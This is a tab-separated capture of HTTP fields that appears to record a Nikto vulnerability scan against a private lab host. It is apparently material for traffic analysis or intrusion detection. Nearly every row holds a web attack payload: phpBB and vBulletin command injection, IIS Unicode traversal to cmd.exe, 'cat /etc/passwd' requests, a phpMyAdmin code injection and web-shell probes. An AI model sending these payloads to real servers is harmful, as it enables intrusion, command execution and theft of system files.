http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									4290						1	http://192.168.1.101/web/modules/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001399)				/web/modules/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4297						1	http://192.168.1.101/web/phpBB/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001399)				/web/phpBB/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4304						1	http://192.168.1.101/web/forum/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001399)				/web/forum/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4311						1	http://192.168.1.101/web/index.php?name=PNphpBB2&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001400)				/web/index.php?name=PNphpBB2&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
																	Keep-Alive										192.168.1.101									4319						1	http://192.168.1.101/web/msadc/msadcs.dll		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001474)				/web/msadc/msadcs.dll
																	Keep-Alive										192.168.1.101									4320						1	http://192.168.1.101/web/uploader.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003018)				/web/uploader.php
																	Keep-Alive										192.168.1.101									4327						1	http://192.168.1.101/web/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003039)				/web/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
																	Keep-Alive										192.168.1.101									4333						1	http://192.168.1.101/web/forum/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003039)				/web/forum/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
																	Keep-Alive										192.168.1.101									4340						1	http://192.168.1.101/web/forums/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003039)				/web/forums/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
																	Keep-Alive										192.168.1.101									4347						1	http://192.168.1.101/web/forumz/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003039)				/web/forumz/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
																	Keep-Alive										192.168.1.101									4353						1	http://192.168.1.101/web/htforum/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003039)				/web/htforum/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
																	Keep-Alive										192.168.1.101									4360						1	http://192.168.1.101/web/board/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003039)				/web/board/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
																	Keep-Alive										192.168.1.101									4367						1	http://192.168.1.101/web/community/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003039)				/web/community/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
																	Keep-Alive										192.168.1.101									4374						1	http://192.168.1.101/web/vb/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003040)				/web/vb/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
																	Keep-Alive										192.168.1.101									4380						1	http://192.168.1.101/web/vbulletin/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003040)				/web/vbulletin/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
																	Keep-Alive										192.168.1.101									4387						1	http://192.168.1.101/web/_vti_bin/fpcount.exe		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003089)				/web/_vti_bin/fpcount.exe
																	Keep-Alive										192.168.1.101									4395						1	http://192.168.1.101/web/site/eg/source.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003126)				/web/site/eg/source.asp
																	Keep-Alive										192.168.1.101									4402						1	http://192.168.1.101/web/certsrv/..%c0%af../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003190)				/web/certsrv/..%c0%af../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4409						1	http://192.168.1.101/web/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003191)				/web/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4416						1	http://192.168.1.101/web/iisadmpwd/..%c0%af../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003192)				/web/iisadmpwd/..%c0%af../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4423						1	http://192.168.1.101/web/msadc/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003193)				/web/msadc/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4430						1	http://192.168.1.101/web/pbserver/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003194)				/web/pbserver/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4437						1	http://192.168.1.101/web/rpc/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003195)				/web/rpc/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4444						1	http://192.168.1.101/web/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003196)				/web/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4450						1	http://192.168.1.101/web/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003197)				/web/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4458						1	http://192.168.1.101/web/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\"		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003198)				/web/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\"
																	Keep-Alive										192.168.1.101									4465						1	http://192.168.1.101/web/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003199)				/web/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/admin/system.php3?cmd=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003216)				/web/admin/system.php3?cmd=cat%20/etc/passwd
																	Keep-Alive										192.168.1.101									4482						1	http://192.168.1.101/web/admin/system.php3?cmd=dir%20c:\\		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003217)				/web/admin/system.php3?cmd=dir%20c:\\
																	Keep-Alive										192.168.1.101									4489						1	http://192.168.1.101/web/admin/exec.php3?cmd=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003218)				/web/admin/exec.php3?cmd=cat%20/etc/passwd
																	Keep-Alive										192.168.1.101									4499						1	http://192.168.1.101/web/admin/exec.php3?cmd=dir%20c:\\		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003219)				/web/admin/exec.php3?cmd=dir%20c:\\
																	Keep-Alive										192.168.1.101									4510						1	http://192.168.1.101/web/isapi/tstisapi.dll		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003263)				/web/isapi/tstisapi.dll
																	Keep-Alive										192.168.1.101									4518						1	http://192.168.1.101/web/certsrv/..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003294)				/web/certsrv/..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4526						1	http://192.168.1.101/web/cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003295)				/web/cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4533						1	http://192.168.1.101/web/iisadmpwd/..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003296)				/web/iisadmpwd/..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4539						1	http://192.168.1.101/web/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003297)				/web/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4545						1	http://192.168.1.101/web/pbserver/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003298)				/web/pbserver/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4552						1	http://192.168.1.101/web/rpc/..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003299)				/web/rpc/..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4558						1	http://192.168.1.101/web/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003300)				/web/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4567						1	http://192.168.1.101/web/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003301)				/web/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver
																	Keep-Alive										192.168.1.101									4575						1	http://192.168.1.101/web/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003302)				/web/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									4583						1	http://192.168.1.101/web/ans.pl?p=../../../../../usr/bin/id|&blah		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003370)				/web/ans.pl?p=../../../../../usr/bin/id|&blah
																	Keep-Alive										192.168.1.101									4590						1	http://192.168.1.101/web/ans/ans.pl?p=../../../../../usr/bin/id|&blah		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003371)				/web/ans/ans.pl?p=../../../../../usr/bin/id|&blah
																	Keep-Alive										192.168.1.101									4597						1	http://192.168.1.101/web/reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003437)				/web/reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF
																	Keep-Alive										192.168.1.101									4604						1	http://192.168.1.101/web/open.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006448)				/web/open.txt
																	Keep-Alive										192.168.1.101									4611						1	http://192.168.1.101/web/fx29id1.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006449)				/web/fx29id1.txt
																	Keep-Alive										192.168.1.101									4619						1	http://192.168.1.101/web/fx29id2.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006450)				/web/fx29id2.txt
																	Keep-Alive										192.168.1.101									4626						1	http://192.168.1.101/web/?-s		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006523)				/web/?-s
																	Keep-Alive										192.168.1.101									4634						1	http://192.168.1.101/web/login.php?-s		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006524)				/web/login.php?-s
																	Keep-Alive										192.168.1.101									4641						1	http://192.168.1.101/web/3rdparty/phpMyAdmin/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/3rdparty/phpMyAdmin/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									4647						1	http://192.168.1.101/web/phpMyAdmin/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/phpMyAdmin/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									4654						1	http://192.168.1.101/web/3rdparty/phpmyadmin/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/3rdparty/phpmyadmin/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									4660						1	http://192.168.1.101/web/phpmyadmin/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/phpmyadmin/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									4667						1	http://192.168.1.101/web/pma/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/pma/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									4673						1	http://192.168.1.101/web/c99.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006739)				/web/c99.php
																	Keep-Alive										192.168.1.101									4682						1	http://192.168.1.101/web/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26cat%20%22/etc/passwd%22%26		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006994)				/web/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26cat%20%22/etc/passwd%22%26
																	Keep-Alive										192.168.1.101									4689						1	http://192.168.1.101/web/script		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006999)				/web/script
																	Keep-Alive										192.168.1.101									4697						1	http://192.168.1.101/web/jenkins/script		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006999)				/web/jenkins/script
																	Keep-Alive										192.168.1.101									4704						1	http://192.168.1.101/web/hudson/script		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006999)				/web/hudson/script
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									4711						1	http://192.168.1.101/web/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									4719						1	http://192.168.1.101/web/axis/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/axis/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									4727						1	http://192.168.1.101/web/axis2/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/axis2/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									4734						1	http://192.168.1.101/web/imcws/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/imcws/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									4741						1	http://192.168.1.101/web/WebServiceImpl/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/WebServiceImpl/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									4748						1	http://192.168.1.101/web/dswsbobje/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/dswsbobje/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									4754						1	http://192.168.1.101/web/ws/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/ws/axis2-admin/login
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									4761						1	http://192.168.1.101/web/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									4768						1	http://192.168.1.101/web/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									4776						1	http://192.168.1.101/web/phpmoadmin/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/phpmoadmin/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									4782						1	http://192.168.1.101/web/phpmoadmin/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/phpmoadmin/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									4789						1	http://192.168.1.101/web/wu-moadmin/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/wu-moadmin/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									4796						1	http://192.168.1.101/web/wu-moadmin/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/wu-moadmin/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									4803						1	http://192.168.1.101/web/moadmin/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/moadmin/moadmin.php
